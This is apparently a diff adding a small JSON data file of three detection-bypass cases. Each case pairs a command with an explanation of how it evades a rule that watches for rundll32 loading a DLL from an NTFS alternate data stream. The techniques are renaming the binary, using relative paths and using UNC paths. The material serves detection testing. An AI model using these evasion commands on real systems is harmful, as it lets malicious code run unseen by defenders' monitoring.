@@ -1,0 +1,14 @@
+[
+  {
+    "output": "copy C:\\Windows\\System32\\rundll32.exe C:\\Users\\Public\\not_rundll.exe && C:\\Users\\Public\\not_rundll.exe \"C:\\path\\to\\file.txt:malicious.dll\",DllMain",
+    "explanation": "The rule relies on 'selection_img' which looks for an Image ending in '\\rundll32.exe' or an OriginalFileName of 'RUNDLL32.EXE'. By copying the rundll32 binary to a new name, the 'Image' condition is bypassed. If the EDR/SIEM does not reliably populate or check 'OriginalFileName' for renamed binaries, this execution will not trigger the rule."
+  },
+  {
+    "output": "rundll32.exe ..\\..\\..\\path\\to\\file.txt:malicious.dll,DllMain",
+    "explanation": "The regex in 'selection_cli' specifically looks for a drive letter pattern ('\\w:\\S+?:'). By using a relative path (e.g., ..\\ or starting from the current directory without a drive letter), the command line avoids matching the regex while still successfully executing the DLL from the Alternate Data Stream."
+  },
+  {
+    "output": "rundll32.exe \" \\\\localhost\\C$\\path\\to\\file.txt:malicious.dll\",DllMain",
+    "explanation": "The regex expects a local drive letter format. By using a UNC path (Universal Naming Convention) to point to the local machine or a remote share, the 'CommandLine' pattern match fails because it does not find the 'C:' style drive mapping followed by the ADS colon."
+  }
+]
